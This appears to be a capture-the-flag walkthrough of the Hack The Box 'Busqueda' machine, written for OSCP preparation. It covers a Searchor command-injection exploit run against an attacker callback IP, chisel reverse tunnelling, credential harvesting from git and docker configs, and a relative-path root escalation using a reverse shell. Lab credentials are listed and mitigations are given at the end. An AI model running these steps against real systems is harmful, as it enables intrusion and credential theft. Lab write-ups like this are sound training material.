---
title: Busqueda
date: 2025-05-31
categories: [oscp, HTB]
tags: [oscp-preparation, walkthrough, HTB, Linux, Python-command-injection, docker-ps, docker-inspect, gitea2hashcat, relative-path-privesc] 
image: bus.png
media_subpath: /assets/img/posts/2025-05-31-busquedaHTB/
---

## Introduction

In this guide, I worked on an easy-rated Linux machine named **Busqueda**. I started by exploiting a command injection vulnerability in a Python module, which gave me initial access as a low-privileged user. While enumerating the system, I discovered Git configuration files containing credentials that let me access a local Gitea instance. I then identified a system checkup script that could be executed with root privileges. By examining this script and its associated Git repository, I found Docker container credentials, which led to administrator access on Gitea. Finally, I exploited a relative path vulnerability in the script to execute code as root, achieving full system compromise.

## Nmap

### TCP

Run a quick Nmap TCP scan:

```bash
sudo nmap -sV $IP --open
```

![image.png](image.png)

### UDP

Check top 100 UDP ports:

```bash
sudo nmap -sU -F $IP
```

![image.png](image%201.png)

### Full Port Scan

```bash
sudo nmap -sV -sC -p- $IP -Pn -n -v --open
```

## Services

### Port 22

Version -OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)

We usually skip SSH.

## Web

### Port 80

Version - Apache httpd 2.4.52

Add the domain to `/etc/hosts` file.

I found the version of the software used at the bottom of the page:

![image.png](image%202.png)

And found this PoC https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection/blob/main/README.md to exploit it.

Running the exploit I was able to get a shell:

```bash
./exploit.sh searcher.htb 10.10.14.12
```

![image.png](image%203.png)

## Privilege Escalation

Checking for other users I don’t see anyone, that means we are gonna do privilege escalation.

- **OSCP Checklist**
    - [x]  Situational awareness
    - [x]  Exposed Confidential
    - [x]  Password Authentication Abuse 
    - [x]  Hunting Sensitive Information
    - [ ]  Sudo
    - [x]  SUID/SGID
    - [x]  Capabilities
    - [x]  Cron Jobs Abuse
    - [ ]  Kernel Exploits
    - [x]  **Check if sudoers file is writable**
    - [ ]  Try credentials you already obtained for various services admin roles
    - [ ]  Check running processes using `pspy`
    

Running `pspy64` I noticed that I can see just my processes:

![image.png](image%204.png)

We can confirm this reading `/etc/fstab` :

![image.png](image%205.png)

- **`hidepid=0`** – Default; all users can see all processes and details.
- **`hidepid=1`** – Users see only their own process details; others' PIDs are visible but info is restricted.
- **`hidepid=2`** – Users see only their own processes; others are completely hidden.

Listing open ports I see other ports are open;

```bash
ss -ntlpu
```

![image.png](image%206.png)

There is `mysql` server running but I don’t have credentials to access I am gonna try to access port 5000, by port forwarding with chisel.

But first let’s make our access persistent with SSH keys. First check if Key Authentication is allowed:

```bash
cat /etc/ssh/sshd_config| grep Pubkey
```

![image.png](image%207.png)

Now I am gonna make public and private key pair:

```bash
ssh-keygen -t rsa
```

**VERY important:**

- `.ssh` must be `700`
- `authorized_keys` must be `600`
- Owned by `svc`

Otherwise SSH **refuses** to use them.

![image.png](image%208.png)

**Chisel Reverse Port Forwarding**

```bash
**./chisel server --reverse --port 51234 #on attacker

./chisel client 10.10.14.12:51234 R:5000:127.0.0.1:5000 #on target**
```

Accessing the site I see it is the same as we saw before:

![image.png](image%209.png)

Gobuster Scan doesn’t return anything:

![image.png](image%2010.png)

Checking for other sites enabled I see:

```bash
cat /etc/apache2/sites-enabled/000-default.conf
```

![image.png](image%2011.png)

There is a Vhost on the port 3000, let’s port forward it and access.

And let’s add a  new domain to `/etc/hosts` file too.

I see the version at the bottom of the page:

![image.png](image%2012.png)

But I need credentials here, searching `.git` directory I found `config` file where cleartext credentials of `cody`present.

![image.png](image%2013.png)

I found out that this password belongs to `svc` user, and I can see now sudo privileges:

![image.png](image%2014.png)

```bash
/usr/bin/python3 /opt/scripts/system-checkup.py *
```

```bash
sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect {% raw %}{{json .}}{% endraw %}f8
```

![image.png](image%2015.png)

Inspecting the `mysql` docker container I see mysql root password and username:

```bash
sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect {% raw %}{{json .}}{% endraw %} f8
```

![image.png](image%2016.png)

```bash
"MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF","MYSQL_USER=gitea", ,"MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh"
```

I cannot connect to `mysql` from target machine because it returns some kind of socket error I am gonna try from local attacker machine forwarding that port to us.

I am gonna use `root`: `jI86kGUuj87guWr3RyF`.

```bash
mysql -u root -p -h 127.0.0.1
```

![image.png](image%2017.png)

I found `gitea` database:

```sql
show databases;
use gitea;
show columns from user;
select name, passwd from user;
```

![image.png](image%2018.png)

I am gonna try to crack this hash, but first we need to conver gitea hashes to hashcat compatible format.

I am gonna use [gitea2hashcat.py](https://github.com/unix-ninja/hashcat/blob/master/tools/gitea2hashcat.py)

You can read more about it here:

[Cracking Gitea's PBKDF2 Password Hashes](https://www.unix-ninja.com/p/cracking_giteas_pbkdf2_password_hashes)

I tried to crack but it was unsuccessful.

I tried obtained passwords to login as Administrator and `MYSQL_PASSWORD` worked. I can see now the scripts.

![image.png](image%2019.png)

I noticed one section in `system-checkup.py` It tries to run `full-checkup.sh` script located in the same directory and it uses relative path.

![image.png](image%2020.png)

![image.png](image%2021.png)

I am gonna create a bash under the directory where I am gonna run sudo command:

![image.png](image%2022.png)

![image.png](image%2023.png)

Now let’s put a reverse shell there:

![image.png](image%2024.png)

![image.png](image%2025.png)

Now I am root!

## Credentials

```bash
cody : jh1usoih2bkjaspwe92

MYSQL_ROOT_PASS - jI86kGUuj87guWr3RyF

MYSQL_PASSWORD - yuiu1hoiu4i5ho1uh
```

## Mitigation

- Sanitize all inputs in scripts and Python modules to prevent command injection.
- Avoid storing plaintext credentials in Git repositories or configuration files.
- Restrict access to internal services like Gitea using firewall rules or authentication.
- Regularly audit and control the use of `sudo` permissions, especially for scripts.
- Use absolute paths in scripts to prevent relative path exploitation.
